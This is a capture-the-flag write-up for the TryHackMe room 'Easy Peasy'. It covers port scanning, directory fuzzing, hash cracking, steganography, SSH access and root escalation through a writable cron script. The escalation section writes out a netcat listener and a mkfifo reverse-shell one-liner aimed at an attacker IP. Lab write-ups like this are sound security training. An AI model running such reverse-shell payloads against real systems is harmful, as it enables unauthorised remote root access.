---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/easy-peasy/","tags":["CTF","write-up"]}
---


![Pasted image 20241129204817.png|400](/img/user/attachments/Pasted%20image%2020241129204817.png)

---
> [!INFO] Info about Easy Peasy
>  Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

> [!FAQ]- Hints
> GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)

---
# Active reconnaissance
## Host discovery
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 61
6498/tcp  open  unknown syn-ack ttl 61
65524/tcp open  unknown syn-ack ttl 61
```

> [!check]- How many ports are open?
> 3

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```

Add the IP to  `/etc/hosts`
```shell
sudo echo "10.10.21.145 easypeasy.thm" | sudo tee -a /etc/hosts
```
## OS
Linux, ubuntu
## Port 6498 - SSH
6498/tcp  open  ssh     **OpenSSH 7.6p1** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
## Port 80 - Nginx
80/tcp    open  http    nginx **1.16.1**
http-server-header: nginx/1.16.1
http-title: Welcome to nginx!
http-robots.txt: 1 disallowed entry
/
![Pasted image 20241129210033.png](/img/user/attachments/Pasted%20image%2020241129210033.png)

> [!check]- What is the version of nginx?
> 1.16.1
## Port 65524 - Apache
65524/tcp open  http    **Apache** httpd **2.4.43** ((Ubuntu))
http-server-header: Apache/2.4.43 (Ubuntu)
http-title: Apache2 Debian Default Page: It works
http-robots.txt: 1 disallowed entry
`/`
![Pasted image 20241129210053.png](/img/user/attachments/Pasted%20image%2020241129210053.png)

> [!check]- What is running on the highest port?
> Apache

---
# Exploitation
## Port 80 - Nginx
Fuzzing
```shell
ffuf -c -t 100 -u http://easypeasy.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -mc all -fc 404
```
![Pasted image 20241129221246.png](/img/user/attachments/Pasted%20image%2020241129221246.png)
### hidden
![Pasted image 20241129221726.png](/img/user/attachments/Pasted%20image%2020241129221726.png)
Fuzzing under hidden
![Pasted image 20241129221411.png](/img/user/attachments/Pasted%20image%2020241129221411.png)
#### whatever
![Pasted image 20241129221743.png](/img/user/attachments/Pasted%20image%2020241129221743.png)
![Pasted image 20241129221854.png](/img/user/attachments/Pasted%20image%2020241129221854.png)
Decode it
```shell
echo "ZmxhZ********RnfQ==" | base64 -d
```

> [!check] Using GoBuster, find flag 1.
> ![Pasted image 20241129222024.png](/img/user/attachments/Pasted%20image%2020241129222024.png)
## Port 65524 - Apache
Analyze the HTML code searching the word *flag*
```shell
curl http://easypeasy.thm:65524/ | grep -i flag
```

> [!check] Crack the hash with easypeasy.txt, What is the flag 3?
> ![Pasted image 20241129212541.png](/img/user/attachments/Pasted%20image%2020241129212541.png)

I found a base62 code
![Pasted image 20241129212832.png](/img/user/attachments/Pasted%20image%2020241129212832.png)
Analisyng with cyberchef
> [!check] What is the hidden directory?
> ![Pasted image 20241130073556.png|500](/img/user/attachments/Pasted%20image%2020241130073556.png)
### robots
![Pasted image 20241129214357.png](/img/user/attachments/Pasted%20image%2020241129214357.png)
It's a MD5 hash
![Pasted image 20241129214717.png](/img/user/attachments/Pasted%20image%2020241129214717.png)
After an extent research I found the answer.
> [!check] Further enumerate the machine, what is flag 2?
> ![Pasted image 20241202084238.png](/img/user/attachments/Pasted%20image%2020241202084238.png)
### n0th...... subdir
![Pasted image 20241202085105.png](/img/user/attachments/Pasted%20image%2020241202085105.png)
Check the source code and I found one more hash
![Pasted image 20241130074429.png|500](/img/user/attachments/Pasted%20image%2020241130074429.png)
Save it in a hash named *hash_easy2*
And crack with john the ripper using the dictionary provides by the room
```shell
john --wordlist=/home/ge0/Downloads/easypeasy_1596838725703.txt hash_easy2
```

> [!check] Using the wordlist that provided to you in this task crack the hash. what is the password?
> ![Pasted image 20241130074348.png](/img/user/attachments/Pasted%20image%2020241130074348.png)
#### Steganography
The binary pic is the only one which is stored on the server, let's check hide metadata
![Pasted image 20241202085318.png](/img/user/attachments/Pasted%20image%2020241202085318.png)
Download

Check with steghide and with the password found before, and a file is hidden.
![Pasted image 20241202085739.png](/img/user/attachments/Pasted%20image%2020241202085739.png)
We  found the credentials
![Pasted image 20241202090204.png](/img/user/attachments/Pasted%20image%2020241202090204.png)
Use Cyber chef and decode this code click on the stick and get the password.
![Pasted image 20241202090054.png](/img/user/attachments/Pasted%20image%2020241202090054.png)
Login via SSH with the credentials and get the user flag
> [!check] User flag
> ![Pasted image 20241202090700.png](/img/user/attachments/Pasted%20image%2020241202090700.png)
> ![Pasted image 20241202103853.png](/img/user/attachments/Pasted%20image%2020241202103853.png)
> That is not the flag yet, some part of text is reversed

---
# Privilege escalation
## Cron jobs
Check the files into the web server folders. I  found a `.sh` script, based on the name, related with some cronjob.
![Pasted image 20241202114525.png](/img/user/attachments/Pasted%20image%2020241202114525.png)
Check the cronjobs, there is a cronjob that runs every minute and actually executes the script from above.
![Pasted image 20241202114722.png](/img/user/attachments/Pasted%20image%2020241202114722.png)
Now we have some ways to exploit this, I gonna send me a reverse shell like root.
But first set a listener on our machine
```shell
rlwrap nc -nlvp 4747
```
I need to change the script content. Adding this line at the final of script
```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.2.59 4747 >/tmp/f" >> /var/www/.mysecretcronjob.sh
```
Just wait a minute and we will receive the shell as root
![Pasted image 20241202115640.png](/img/user/attachments/Pasted%20image%2020241202115640.png)

> [!check] Root flag
> ![Pasted image 20241202115829.png](/img/user/attachments/Pasted%20image%2020241202115829.png)

---